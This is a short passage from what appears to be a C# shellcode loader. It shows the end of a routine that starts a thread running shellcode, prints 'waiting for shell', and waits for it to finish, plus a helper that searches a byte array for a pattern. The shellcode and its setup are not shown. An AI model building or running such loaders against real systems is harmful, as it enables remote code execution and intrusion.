            if (th == IntPtr.Zero) { Console.WriteLine("[-] CreateThread failed"); return; }
            Console.WriteLine("[+] Thread started, waiting for shell...");

            WaitForSingleObject(th, 0xFFFFFFFF);
            Console.WriteLine("[*] Shellcode thread finished");
        }

        static int FindBytes(byte[] src, byte[] pat)
        {
            for (int i = 0; i <= src.Length - pat.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < pat.Length; j++)
                    if (src[i + j] != pat[j]) { ok = false; break; }
                if (ok) return i;
            }
            return -1;
        }
    }
